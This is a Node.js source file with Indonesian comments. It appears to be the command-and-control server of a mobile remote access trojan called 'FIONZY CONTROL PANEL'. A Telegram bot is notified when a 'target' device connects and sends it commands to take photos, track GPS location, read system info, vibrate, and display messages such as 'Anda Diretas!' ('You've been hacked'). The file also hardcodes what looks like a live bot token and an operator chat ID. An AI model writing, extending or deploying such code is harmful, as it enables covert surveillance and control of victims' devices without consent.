const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI BOT (GANTI DI SINI!) ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; // Ganti dengan token @BotFather
const bot = new Telegraf(BOT_TOKEN);

// UI Menu Utama
const mainMenu = (ctx) => {
    ctx.replyWithMarkdownV2(
        `⚡ *FIONZY CONTROL PANEL v7\\.0* ⚡\n` +
        `──────────────\n` +
        `📱 *Status:* ONLINE\n` +
        `🛡️ *Protocol:* SECURE\n` +
        `──────────────\n` +
        `*Silahkan pilih perintah kendali:*`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
            [Markup.button.callback('📳 Vibrate', 'vibrate'), Markup.button.callback('🔋 System Info', 'info')],
            [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
        ])
    );
};

// Logika Socket
io.on('connection', (socket) => {
    console.log('⚡ Target Terkoneksi!');
    bot.telegram.sendMessage(7373392803, "✅ **Target Baru Terdeteksi!**\nSilahkan buka /menu", { parse_mode: 'Markdown' });
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Tombol
bot.action('snap', (ctx) => { io.emit('command', '/snap'); ctx.answerCbQuery('📸 Meminta Foto...'); });
bot.action('gps', (ctx) => { io.emit('command', '/gps'); ctx.answerCbQuery('📍 Melacak Lokasi...'); });
bot.action('vibrate', (ctx) => { io.emit('command', '/vibrate'); ctx.answerCbQuery('📳 Bergetar!'); });
bot.action('info', (ctx) => { io.emit('command', '/info'); ctx.answerCbQuery('🔋 Mengambil Info...'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast Anda Diretas!`", { parse_mode: 'Markdown' }));

// Handler Pesan Teks (Toast)
bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Toast Terkirim!");
    }
});

server.listen(3000, '0.0.0.0', () => {
    console.log('⚡ SERVER FIONZY AKTIF DI PORT 3000');
    console.log('⚡ BOT TELEGRAM: ONLINE');
});
bot.launch();
